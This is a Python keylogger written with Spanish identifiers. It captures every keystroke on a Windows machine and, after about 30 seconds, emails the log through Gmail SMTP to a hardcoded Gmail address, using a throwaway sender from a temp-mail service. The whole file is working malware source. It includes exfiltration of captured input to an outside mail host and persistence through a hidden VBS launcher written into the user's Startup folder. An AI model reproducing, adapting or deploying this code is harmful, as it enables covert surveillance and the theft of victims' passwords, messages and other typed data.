import datetime
from pynput.keyboard import Listener
import requests
from cryptography.fernet import Fernet

import time

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

import getpass, os

from stegano import lsb

def key_listener():
    d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    
    file_name = 'keylogger_{}.txt'.format(d)
    
    f = open(file_name, 'w')
    
    t0 = time.time()
    
    def key_recorder(key):
        key = str(key)
        if key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace","%BORRAR%"))
        elif key == '<65027>':
            f.write('@') 
        elif key == "'\\x03'":
            f.write('\n\nSaliendo del Keylogger . . .')
            f.close()
            quit()
        else:
            f.write(key.replace("'", ""))

        if time.time()-t0 > 30:
            f.close()
            send_email(file_name)

    with Listener(on_press=key_recorder) as listener:
        listener.join()
    
def get_temp_email():
    response = requests.get("https://api.internal.temp-mail.io/api/v3/email/new")
    if response.status_code == 200:
        return response.json()["email"]
    else:
        return None    
    
def send_email(nombre):
    
    def load_key():
        return open('pass.key', 'rb').read()
    
    key = load_key()
    
    clave = Fernet(key)
    pass_enc = (open('pass.enc', 'rb').read())
    password = clave.decrypt((pass_enc)).decode()
    
    msg = MIMEMultipart()
    mensaje = 'Contenido del keylogger'
    
    msg['From'] = get_temp_email()
    msg['To'] = 'eduardoalfa71@gmail.com'
    msg['Subject'] = 'Deberes'
    
    msg.attach(MIMEText(mensaje, 'plain'))
    
    attachment = open(nombre, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition',"attachment; filename = %s" % str(nombre))
    msg.attach(p)
    
    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'],password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
    
def load_file():
    USER_NAME = getpass.getuser()
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))
    
    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        bat_file.write('python "keylogger.py"')
        
    with open(final_path+'\\'+"open.vbs","w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n')
        vbs_file.write('Set WinScripthost = Nothing\n')
    
if __name__  == '__main__':
    load_file()
    key_listener()